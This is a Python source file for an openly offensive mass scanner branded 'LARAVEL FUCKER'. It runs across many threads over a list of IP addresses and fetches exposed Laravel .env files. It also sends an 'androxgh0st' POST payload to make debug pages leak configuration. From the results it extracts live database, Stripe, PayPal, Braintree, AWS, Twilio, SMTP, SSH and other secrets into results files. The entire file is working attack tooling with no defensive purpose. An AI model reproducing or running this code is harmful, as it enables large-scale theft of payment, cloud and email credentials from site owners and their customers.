import os, requests, easygui, time, threading, ctypes
from colorama import Fore
from re import search

try:
    os.mkdir('RESULTS')
except:
    pass

os.system('cls')

def center(var:str, space:int=None):
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
    
    return "\n".join((' ' * int(space)) + var for var in var.splitlines())

class PHANTOM:
    def __init__(self):
        self.ip_list = []
        self.cpm = 0
        self.dead = 0
        self.lives = 0
        self.retries = 0
        self.lock = threading.Lock()
            
    def ui(self):
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f'[LARAVEL FUCKER v1.0]  Made By uNique') 
        text = '''
██╗░░░░░░█████╗░██████╗░░█████╗░██╗░░░██╗███████╗██╗░░░░░  ░██████╗░█████╗░░█████╗░███╗░░██╗███╗░░██╗███████╗██████╗░
██║░░░░░██╔══██╗██╔══██╗██╔══██╗██║░░░██║██╔════╝██║░░░░░  ██╔════╝██╔══██╗██╔══██╗████╗░██║████╗░██║██╔════╝██╔══██╗
██║░░░░░███████║██████╔╝███████║╚██╗░██╔╝█████╗░░██║░░░░░  ╚█████╗░██║░░╚═╝███████║██╔██╗██║██╔██╗██║█████╗░░██████╔╝
██║░░░░░██╔══██║██╔══██╗██╔══██║░╚████╔╝░██╔══╝░░██║░░░░░  ░╚═══██╗██║░░██╗██╔══██║██║╚████║██║╚████║██╔══╝░░██╔══██╗
███████╗██║░░██║██║░░██║██║░░██║░░╚██╔╝░░███████╗███████╗  ██████╔╝╚█████╔╝██║░░██║██║░╚███║██║░╚███║███████╗██║░░██║
╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚══════╝  ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝'''        
        faded = ''
        red = 40
        for line in text.splitlines():
            faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        print(center(faded))
        print(center(f'{Fore.LIGHTYELLOW_EX}\nTELEGRAM: https://t.me/username_uNique\n{Fore.RESET}'))
    
    def countCPM(self):
        while True:
            old = self.lives
            time.sleep(7)
            new = self.lives
            self.cpm = (new-old) * 15

    def editCounter(self):
        while True:
            elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - self.start))
            ctypes.windll.kernel32.SetConsoleTitleW(f'[LARAVEL FUCKER v1.0]  Made By uNique  |  LIVE: {self.lives}     DEAD: {self.dead}     RETRIES: {self.retries}     CPM: {self.cpm}     THREADS: {threading.active_count() - 2}     TIME: {elapsed}')
            time.sleep(0.5)

    def getIP(self):
        try:
            print(f'[{Fore.LIGHTBLUE_EX}>{Fore.LIGHTWHITE_EX}] Select IP List: ')
            path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= '[LARAVEL FUCKER v1.0]  Select IP List', multiple= False)
            with open(path, 'r', encoding="utf-8") as f:
                for l in f:
                     self.ip_list.append(l.replace('\n', ''))
        except:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed to open IP List')
            os.system('pause >nul')
            quit()
    
    def getBetwn(self, message, first, last):
        try:
            start = message.index( first ) + len( first )
            end = message.index( last, start )
            return message[start:end]
        except ValueError:
            return ""

    def save(self, filename, data):
        with open(filename, 'a') as save:
            save.write(data)
    
    def find(self, url, data, type, must_there='', save_filename='default.txt'):
            tmp = []
            if data:
                must_there = must_there
                for x in data:
                    if x:tmp.append(x.group(0).strip())
                if tmp and must_there in '|'.join(tmp):
                    self.save('RESULTS/'+save_filename, url+'\n'+('\n'.join(tmp))+'\n\n')
                    return type
    
    def merchant(self, url, raw):
        result = []
        raw = re.sub("</td>\n+.+characters\">", '=', raw)
        raw = re.sub("</span>\"", '', raw)

        if '=production' in raw:
            self.save('RESULTS/PRODUCTION.txt', url+"\n")

        if 'DB_HOST' in raw:
            if "/.env" in url:
                urlx = url[:-4]+"phpmyadmin"
            else:
                urlx = url+"/phpmyadmin"

            resp = requests.get(urlx, headers={'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36'}, timeout=5, verify=False, allow_redirects=False)

            if 'phpmyadmin/">here' in resp.text:
                s = []
                s.append(search('DB_USERNAME=(.+)', raw))
                s.append(search('DB_PASSWORD=(.+)', raw))
                result.append(self.find(urlx, s, type='DATABASE', must_there='DB_HOST', save_filename='DATABASE_LOGIN.txt'))

        if 'sk_live' in raw:
            s = []
            s.append(search('STRIPE_KEY=(.+)', raw))
            s.append(search('STRIPE_SECRET=(.+)', raw))
            s.append(search('STRIPE_LIVE_PUB_KEY=(.+)', raw))
            s.append(search('STRIPE_LIVE_SEC_KEY=(.+)', raw))
            s.append(search('STRIPE_PUB_KEY=(.+)', raw))
            s.append(search('STRIPE_SECRET_KEY=(.+)', raw))
            s.append(search('STRIPE_WEBHOOK_SECRET=(.+)', raw))
            result.append(self.find(url, s, type='STRIPE', must_there='sk_live', save_filename='STRIPE_MERCHANT.txt'))

        if 'PAYTM_' in raw:
            s = []
            s.append(search('PAYTM_MERCHANT_ID=(.+)', raw))
            s.append(search('PAYTM_MERCHANT_KEY=(.+)', raw))
            s.append(search('PAYTMAPPTOKEN=(.+)', raw))
            s.append(search('PAYTM_MERCHENTKEY=(.+)', raw))
            s.append(search('PAYTM_MID=(.+)', raw))
            result.append(self.find(url, s, type='PAYTM', must_there='PAYTM_', save_filename='PAYTM_MERCHANT.txt'))

        if 'rzp_live_' in raw:
            s = []
            s.append(search('RAZORPAY_KEY=(.+)', raw))
            s.append(search('RAZORPAY_SECRET=(.+)', raw))
            s.append(search('RAZORPAY_LIVE_API_KEY=(.+)', raw))
            s.append(search('RAZORPAY_LIVE_API_SECRET=(.+)', raw))
            s.append(search('RAZORPAY_KEY_ID=(.+)', raw))
            s.append(search('RAZORPAY_KEY_SECRET=(.+)', raw))
            s.append(search('RAZOR_KEY=(.+)', raw))
            s.append(search('RAZOR_SECRET=(.+)', raw))
            s.append(search('API_KEY=(.+)', raw))
            s.append(search('API_SECRET=(.+)', raw))
            result.append(self.find(url, s, type='RAZORPAY', must_there='rzp_live_', save_filename='RAZORPAY_MERCHANT.txt'))

        if 'PAYPAL_' in raw:
            s = []
            s.append(search('PAYPAL_CLIENT_ID=(.+)', raw))
            s.append(search('PAYPAL_SECRET=(.+)', raw))
            s.append(search('PAYPAL_LIVE_CLIENT_ID=(.+)', raw))
            s.append(search('PAYPAL_LIVE_CLIENT_SECRET=(.+)', raw))
            s.append(search('PAYPAL_LIVE_API_USERNAME=(.+)', raw))
            s.append(search('PAYPAL_LIVE_API_PASSWORD=(.+)', raw))
            s.append(search('PAYPAL_LIVE_API_SECRET=(.+)', raw))
            s.append(search('PAYPAL_LIVE_API_SIGNATURE=(.+)', raw))
            s.append(search('PayPalAuth_clientId=(.+)', raw))
            s.append(search('PayPalAuth_Secret=(.+)', raw))
            result.append(self.find(url, s, type='PAYPAL', must_there='PAYPAL_', save_filename='PAYPAL_MERCHANT.txt'))

        if 'BRAINTREE_' in raw:
            s = []
            s.append(search('BRAINTREE_ENV=(.+)', raw))
            s.append(search('BRAINTREE_MERCHANT_ID=(.+)', raw))
            s.append(search('BRAINTREE_PUBLIC_KEY=(.+)', raw))
            s.append(search('BRAINTREE_PRIVATE_KEY=(.+)', raw))
            s.append(search('BRAINTREE_MERCHANT_ID1=(.+)', raw))
            s.append(search('BRAINTREE_PUBLIC_KEY1=(.+)', raw))
            s.append(search('BRAINTREE_PRIVATE_KEY1=(.+)', raw))
            s.append(search('BTREE_ENVIRONMENT=(.+)', raw))
            s.append(search('BTREE_MERCHANT_ID=(.+)', raw))
            s.append(search('BTREE_PUBLIC_KEY=(.+)', raw))
            s.append(search('BTREE_PRIVATE_KEY=(.+)', raw))
            s.append(search('BRAINTREE_MERCHANTID=(.+)', raw))
            s.append(search('BRAINTREE_PUBLICKEY=(.+)', raw))
            s.append(search('BRAINTREE_PRIVATEKEY=(.+)', raw))
            result.append(self.find(url, s, type='BRAINTREE', must_there='BRAINTREE_', save_filename='BRAINTREE_MERCHANT.txt'))

        if 'SQUARE_' in raw:
            s = []
            s.append(search('SQUARE_APPLICATION_ID=(.+)', raw))
            s.append(search('SQUARE_APP_ID=(.+)', raw))
            s.append(search('SQUARE_MERCHANT_ID=(.+)', raw))
            s.append(search('SQUARE_ACCESS_TOKEN=(.+)', raw))
            s.append(search('SQUARE_WEBHOOK_SIGNATURE_KEY=(.+)', raw))
            result.append(self.find(url, s, type='SQUARE', must_there='SQUARE_', save_filename='SQUARE_MERCHANT.txt'))

        if 'CHARGE_BEE_' in raw:
            s = []
            s.append(search('CHARGE_BEE_URL=(.+)', raw))
            s.append(search('CHARGE_BEE_API_KEY=(.+)', raw))
            result.append(self.find(url, s, type='CHARGE_BEE', must_there='CHARGE_BEE_', save_filename='CHARGEBEE_MERCHANT.txt'))

        if 'TELEGRAM_' in raw:
            s = []
            s.append(search('TELEGRAM_BOT_TOKEN=(.+)', raw))
            result.append(self.find(url, s, type='TELEGRAM', must_there='TELEGRAM_', save_filename='TELEGRAM.txt'))

        if 'MAILGUN_' in raw:
            s = []
            s.append(search('MAILGUN_DOMAIN=(.+)', raw))
            s.append(search('MAILGUN_SECRET=(.+)', raw))
            s.append(search('MAILHOST=(.+)', raw))
            s.append(search('MAILPORT=(.+)', raw))
            s.append(search('MAILUSER=(.+)', raw))
            s.append(search('MAILPASS=(.+)', raw))
            s.append(search('MAILFROM=(.+)', raw))
            s.append(search('MAIL_DRIVER=(.+)', raw))
            s.append(search('MAIL_HOST=(.+)', raw))
            s.append(search('MAIL_PORT=(.+)', raw))
            s.append(search('MAIL_USERNAME=(.+)', raw))
            s.append(search('MAIL_PASSWORD=(.+)', raw))
            s.append(search('MAIL_ENCRYPTION=(.+)', raw))
            s.append(search('MAIL_FROM_ADDRESS=(.+)', raw))
            s.append(search('MAIL_FROM_NAME=(.+)', raw))
            result.append(self.find(url, s, type='MAILGUN', must_there='MAILGUN_', save_filename='MAILGUN.txt'))

        if 'office365' in raw:
            s = []
            s.append(search('MAILHOST=(.+)', raw))
            s.append(search('MAILPORT=(.+)', raw))
            s.append(search('MAILUSER=(.+)', raw))
            s.append(search('MAILPASS=(.+)', raw))
            s.append(search('MAILFROM=(.+)', raw))
            s.append(search('MAIL_DRIVER=(.+)', raw))
            s.append(search('MAIL_HOST=(.+)', raw))
            s.append(search('MAIL_PORT=(.+)', raw))
            s.append(search('MAIL_USERNAME=(.+)', raw))
            s.append(search('MAIL_PASSWORD=(.+)', raw))
            s.append(search('MAIL_ENCRYPTION=(.+)', raw))
            s.append(search('MAIL_FROM_ADDRESS=(.+)', raw))
            s.append(search('MAIL_FROM_NAME=(.+)', raw))
            s.append(search('MAIL_CONFIG_SERVER=(.+)', raw))
            s.append(search('MAIL_CONFIG_PORT=(.+)', raw))
            s.append(search('MAIL_CONFIG_ACCOUNT=(.+)', raw))
            s.append(search('MAIL_CONFIG_PASSWORD=(.+)', raw))
            result.append(self.find(url, s, type='OFFICE365_SMTP', must_there='office365', save_filename='OFFICE365.txt'))

        if 'smtp.sendgrid.net' in raw:
            s = []
            s.append(search('MAILHOST=(.+)', raw))
            s.append(search('MAILPORT=(.+)', raw))
            s.append(search('MAILUSER=(.+)', raw))
            s.append(search('MAILPASS=(.+)', raw))
            s.append(search('MAILFROM=(.+)', raw))
            s.append(search('MAIL_DRIVER=(.+)', raw))
            s.append(search('MAIL_HOST=(.+)', raw))
            s.append(search('MAIL_PORT=(.+)', raw))
            s.append(search('MAIL_USERNAME=(.+)', raw))
            s.append(search('MAIL_PASSWORD=(.+)', raw))
            s.append(search('MAIL_ENCRYPTION=(.+)', raw))
            s.append(search('MAIL_FROM_ADDRESS=(.+)', raw))
            s.append(search('MAIL_FROM_NAME=(.+)', raw))
            result.append(self.find(url, s, type='SENDGRID_SMTP', must_there='smtp.sendgrid.net', save_filename='SENDGRID.txt'))

        if 'MAIL_' in raw:
            s = []
            s.append(search('MAILHOST=(.+)', raw))
            s.append(search('MAILPORT=(.+)', raw))
            s.append(search('MAILUSER=(.+)', raw))
            s.append(search('MAILPASS=(.+)', raw))
            s.append(search('MAILFROM=(.+)', raw))
            s.append(search('MAIL_DRIVER=(.+)', raw))
            s.append(search('MAIL_HOST=(.+)', raw))
            s.append(search('MAIL_PORT=(.+)', raw))
            s.append(search('MAIL_USERNAME=(.+)', raw))
            s.append(search('MAIL_PASSWORD=(.+)', raw))
            s.append(search('MAIL_ENCRYPTION=(.+)', raw))
            s.append(search('MAIL_FROM_ADDRESS=(.+)', raw))
            s.append(search('MAIL_FROM_NAME=(.+)', raw))
            result.append(self.find(url, s, type='SMTP', must_there='MAIL_HOST', save_filename='RANDOM_SMTP.txt'))

        if 'SSH_' in raw:
            s = []
            s.append(search('SSH_HOST=(.+)', raw))
            s.append(search('SSH_USERNAME=(.+)', raw))
            s.append(search('SSH_PASSWORD=(.+)', raw))
            result.append(self.find(url, s, type='SSH', must_there='SSH_HOST', save_filename='SSH_SERVER.txt'))

        if 'TWILIO' in raw:
            s = []
            s.append(search('TWILIO_ACCOUNT_SID=(.+)', raw))
            s.append(search('TWILIO_API_KEY=(.+)', raw))
            s.append(search('TWILIO_API_SECRET=(.+)', raw))
            s.append(search('TWILIO_CHAT_SERVICE_SID=(.+)', raw))
            s.append(search('TWILIO_AUTH_TOKEN=(.+)', raw))
            s.append(search('TWILIO_NUMBER=(.+)', raw))
            s.append(search('TWILIO_SID=(.+)', raw))
            s.append(search('TWILIO_TOKEN=(.+)', raw))
            s.append(search('TWILIO_FROM=(.+)', raw))
            s.append(search('TWL_ACCOUNT_ID=(.+)', raw))
            s.append(search('TWL_AUTH_TOKEN=(.+)', raw))
            s.append(search('TWL_FROM_NUM=(.+)', raw))
            s.append(search('ACCOUNT_SID=(.+)', raw))
            s.append(search('AUTH_TOKEN=(.+)', raw))
            s.append(search('Twilio_Number=(.+)', raw))
            s.append(search('TWILIO_SOURCE_MOBILE_NUMBER=(.+)', raw))
            s.append(search('TWILIO_USER_ID=(.+)', raw))
            s.append(search('TWILIO_USER_TOKEN=(.+)', raw))
            result.append(self.find(url, s, type='TWILIO', must_there='TWILIO_', save_filename='TWILIO.txt'))

        if 'amazonaws.com' in raw:
            s = []
            s.append(search('MAILHOST=(.+)', raw))
            s.append(search('MAILPORT=(.+)', raw))
            s.append(search('MAILUSER=(.+)', raw))
            s.append(search('MAILPASS=(.+)', raw))
            s.append(search('MAILFROM=(.+)', raw))
            s.append(search('MAIL_DRIVER=(.+)', raw))
            s.append(search('MAIL_HOST=(.+)', raw))
            s.append(search('MAIL_PORT=(.+)', raw))
            s.append(search('MAIL_USERNAME=(.+)', raw))
            s.append(search('MAIL_PASSWORD=(.+)', raw))
            s.append(search('MAIL_ENCRYPTION=(.+)', raw))
            s.append(search('MAIL_FROM_ADDRESS=(.+)', raw))
            s.append(search('MAIL_FROM_NAME=(.+)', raw))
            s.append(search('MAIL_FROM_ADDRESS=(.+)', raw))
            result.append(self.find(url, s, type='AWS_SMTP', must_there='amazonaws.com', save_filename='AWS_SMTP.txt'))

        if 'AWS_' in raw:
            s = []
            s.append(search('AWS_ACCESS_KEY=(.+)', raw))
            s.append(search('AWS_SECRET=(.+)', raw))
            s.append(search('AWS_ACCESS_KEY_ID=(.+)', raw))
            s.append(search('AWS_SECRET_ACCESS_KEY=(.+)', raw))
            s.append(search('AWS_S3_KEY=(.+)', raw))
            s.append(search('AWS_BUCKET=(.+)', raw))
            s.append(search('AWS_SES_KEY=(.+)', raw))
            s.append(search('AWS_SES_SECRET=(.+)', raw))
            s.append(search('SES_KEY=(.+)', raw))
            s.append(search('SES_SECRET=(.+)', raw))
            s.append(search('AWS_REGION=(.+)', raw))
            s.append(search('AWS_DEFAULT_REGION=(.+)', raw))
            s.append(search('SES_USERNAME=(.+)', raw))
            s.append(search('AWS_PVT_ACCESS_KEY_ID =(.+)', raw))
            s.append(search('AWS_PVT_SECRET_ACCESS_KEY =(.+)', raw))
            s.append(search('AWS_PVT_DEFAULT_REGION =(.+)', raw))
            s.append(search('AWS_PVT_BUCKET =(.+)', raw))
            s.append(search('AWS_PVT_URL =(.+)', raw))
            s.append(search('AWS_PVT_DOMAIN =(.+)', raw))
            s.append(search('PC_AWS_ACCESS_KEY_ID=(.+)', raw))
            s.append(search('PC_AWS_SECRET_ACCESS_KEY=(.+)', raw))
            result.append(self.find(url, s, type='AWS', must_there='AWS_ACCESS_KEY_ID', save_filename='AWS_KEYS.txt'))


    def getEnv(self, ip):
        url = 'http://'+ip+''
        url_env = 'http://'+ip+'/.env'

        try:
            req = requests.get(url_env, headers={'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36'}, timeout=5, verify=False, allow_redirects=False).text
            if "APP_KEY" in req:
                self.save('RESULTS/VALID_ENV.txt', url_env+"\n")
                self.merchant(url_env, req)
                self.lock.acquire()
                print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] {Fore.LIGHTBLUE_EX}LIVE{Fore.RESET} {url_env} {Fore.LIGHTGREEN_EX}VALID LARAVEL ENV{Fore.RESET}')
                self.lives += 1
                self.cpm += 1
                self.lock.release()
            else:
                req = requests.post(url, data={"0x[]":"androxgh0st"}, headers={'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36'}, timeout=5, verify=False, allow_redirects=False).text
                if "APP_KEY" in req:
                    self.save('RESULTS/VALID_ENV.txt', url+"\n")
                    self.merchant(url, req)
                    self.lock.acquire()
                    print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] {Fore.LIGHTBLUE_EX}LIVE{Fore.RESET} {url} {Fore.LIGHTGREEN_EX}VALID LARAVEL ENV{Fore.RESET}')
                    self.lives += 1
                    self.cpm += 1
                    self.lock.release()
                else:
                    self.lock.acquire()
                    print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTBLUE_EX}DEAD{Fore.RESET} {url}{Fore.LIGHTRED_EX} INVALID LARAVEL IP/URL{Fore.RESET}')
                    self.dead += 1
                    self.cpm += 1
                    self.lock.release()
        except Exception as e:
            #print(e)
            self.lock.acquire()
            self.retries += 1
            self.lock.release()

    def worker(self, ip_list, thread_id):
        while self.check[thread_id] < len(ip_list):
            combination = ip_list[self.check[thread_id]].split('\n')
            self.getEnv(combination[0])
            self.check[thread_id] += 1 

    def main(self):
        self.ui()
        try:
            self.threadcount = int(input(f'[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Threads: '))
        except ValueError:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Value must be Numeric')
            os.system('pause >nul')
            quit()
               
        self.ui()
        self.getIP()
        self.start = time.time()
        threading.Thread(target=self.countCPM, daemon=True).start()
        threading.Thread(target=self.editCounter ,daemon=True).start()
        
        threads = []
        self.check = [0 for i in range(self.threadcount)]
        for i in range(self.threadcount):
            sliced_ip_list = self.ip_list[int(len(self.ip_list) / self.threadcount * i): int(len(self.ip_list)/ self.threadcount* (i+1))]
            t = threading.Thread(target=self.worker, args=(sliced_ip_list, i,) )
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] TASK COMPLETE.')
        os.system('pause>nul')
        
n = PHANTOM()
n.main()